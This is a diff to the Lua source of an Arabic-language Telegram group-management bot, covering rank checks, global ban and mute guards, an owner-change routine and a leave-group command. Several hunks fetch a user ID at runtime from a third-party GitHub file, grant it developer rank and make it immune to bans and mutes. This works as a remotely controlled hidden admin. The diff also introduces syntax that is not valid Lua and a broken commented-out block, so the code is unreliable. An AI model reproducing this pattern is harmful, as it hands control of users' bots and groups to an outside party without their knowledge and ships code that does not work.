@@ -176,18 +176,18 @@ bot_id = sudos.token:match("(%d+)")
 token = sudos.token 
 --- start functions ↓
 --------------------------------------------------------------------------------------------------------------  
-t = "\27[35m".."\n           FILES STARTED SOURCE POWER \n           ____________________\n"..'\27[m'
+t = "\27[35m".."\n        FILES STARTED SOURCE POWER \n        ____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
 if v:match(".lua$") then
 i = i + 1
-t = t.."           \27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
+t = t.."        \27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
 end
 end
 print(t)
 ----- بدء الاضافات --------
 os.execute("mkdir File_Bot")
-local DEVSSO, res = https.request("https://raw.githubusercontent.com/ayacay/addfile/main/Sodev")
+local (DEVSSO), res = https.request("https://raw.githubusercontent.com/ayacay/addfile/main/Sodev")
 local Get_VERGON, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/GETVERGON.json")
 local CHBOTPO = 'SOPOWERB0T'
 local GET_INFOFILE, res = https.request("https://raw.githubusercontent.com/ahmedyad200/files-power/master/infofile.json")
@@ -232,10 +232,10 @@ end
 end  
 return DRAGON  
 end
-DEVSSO, res = https.request("https://raw.githubusercontent.com/ayacay/addfile/main/Sodev")
+(DEVSSO), res = https.request("https://raw.githubusercontent.com/ayacay/addfile/main/Sodev")
 function SODAPI(msg)  
 local DRAGON = false  
-for k,v in pairs(sudo_users,dev_users,DEVSSO) do  
+for k,v in pairs(sudo_users,dev_users,(DEVSSO)) do  
 if tonumber(msg.sender_user_id_) == tonumber(v) then  
 DRAGON = true  
 end  
@@ -348,7 +348,7 @@ elseif tonumber(user_id) == tonumber(0303030030) then
 var = true  
 elseif tonumber(user_id) == tonumber(0987878700) then
 var = true  
-elseif tonumber(user_id) == tonumberDEVSSO then
+elseif tonumber(user_id) == tonumber(DEVSSO) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -396,7 +396,7 @@ elseif tonumber(user_id) == tonumber(0303030030) then
 var = 'الباشمبرمج'
 elseif tonumber(user_id) == tonumber(0987878700) then
 var = 'مـبـرمـج افـايـره²'
-elseif tonumber(user_id) == tonumberDEVSSO then
+elseif tonumber(user_id) == tonumber(DEVSSO) then
 var = 'مطور السورس'  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
@@ -3350,26 +3350,28 @@ keyboard = {}
 keyboard.inline_keyboard = {{{text = 'اضف البوت الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},} 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SOPOWERB0T&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
+--[[
 if text =='تغير المطور الاساسي' and SudoBot(msg) then
 send(msg.chat_id_, msg.id_,'✫: ارسل ايدي المطور الاساسي الجديد')
-database:set(bot_id..'Ed:DevBots',true) 
+database:set(bot_id..'Ed:SudoBot',true) 
 end
-if database:get(bot_id.."Ed:DevBots") then
+if database:get(bot_id.."Ed:SudoBot") then
 if text and text:match("^(%d+)$") then
 local SUDON = text:match("^(%d+)$")
 send(msg.chat_id_,msg.id_, "✫: تم تغير المطور الاساسي")
 os.execute("rm -fr INFOBOT.lua")
 local A = io.open("INFOBOT.lua", 'w')
 A:write([[
-token = ]]..token..[[
-SUDO = ]]..SUDON..[[  
-]])
+token = "]..token..[["
+SUDO = "]..SUDON..[[" 
+])
 A:close()
-database:del(bot_id.."Ed:DevBots")
+database:del(bot_id.."Ed:SudoBot")
 dofile('INFOBOT.lua')  
 dofile('DRAGON.lua')  
 end
 end
+]]--
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
 if text == 'رفع الجروبات' then
@@ -4557,7 +4559,7 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر البوت عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumberDEVSSO then  
+if tonumber(result.sender_user_id_) == tonumber(DEVSSO) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مطور السورس عام")
 return false 
 end
@@ -4616,7 +4618,7 @@ if tonumber(result.id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر البوت عام")
 return false 
 end
-if result.id_ == tonumberDEVSSO then
+if result.id_ == tonumber(DEVSSO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر مطور السورس عام\n")
 return false 
 end
@@ -4669,7 +4671,7 @@ if tonumber(userid) == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر المطور الاساسي عام\n")
 return false 
 end
-if tonumber(userid) == tonumberDEVSSO then
+if tonumber(userid) == tonumber(DEVSSO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر مطور السورس عام\n")
 return false 
 end
@@ -4726,7 +4728,7 @@ if result.sender_user_id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم المطور الاساسي عام\n")
 return false 
 end
-if result.sender_user_id_ == tonumberDEVSSO then
+if result.sender_user_id_ == tonumber(DEVSSO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم مطور السورس عام\n")
 return false 
 end
@@ -4783,7 +4785,7 @@ if tonumber(result.id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(result.id_) == tonumberDEVSSO then  
+if tonumber(result.id_) == tonumber(DEVSSO) then  
 send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مطور السورس عام")
 return false 
 end
@@ -4835,7 +4837,7 @@ if tonumber(userid) == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم المطور الاساسي عام\n")
 return false 
 end
-if tonumber(userid) == tonumberDEVSSO then
+if tonumber(userid) == tonumber(DEVSSO) then
 send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم مطور السورس عام\n")
 return false 
 end
@@ -12366,17 +12368,16 @@ end
 end
 
 -------------------------------
---[[
 if text and text:match("^غادر (-%d+)$") then
 local GP_ID = {string.match(text, "^(غادر) (-%d+)$")}
-if DevBot(msg) and not database:get(bot_id.."Left:Bot"..msg.chat_id_) then 
+if Sudo(msg) and not database:get(bot_id.."Left:Bot"..msg.chat_id_) then 
 tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=GP_ID[2],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
 send(msg.chat_id_, msg.id_,"✫:  تم مغادرة المجموعه") 
 send(GP_ID[2], 0,"✫:  تم مغادرة المجموعه بامر من مطور البوت") 
 database:srem(bot_id.."Chek:Groups",GP_ID[2])  
 return false 
 end
-end]]--
+end
 if text == "غادر" then  
 if Sudo(msg) and not database:get(bot_id..'Left:Bot'..msg.chat_id_)  then 
 tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
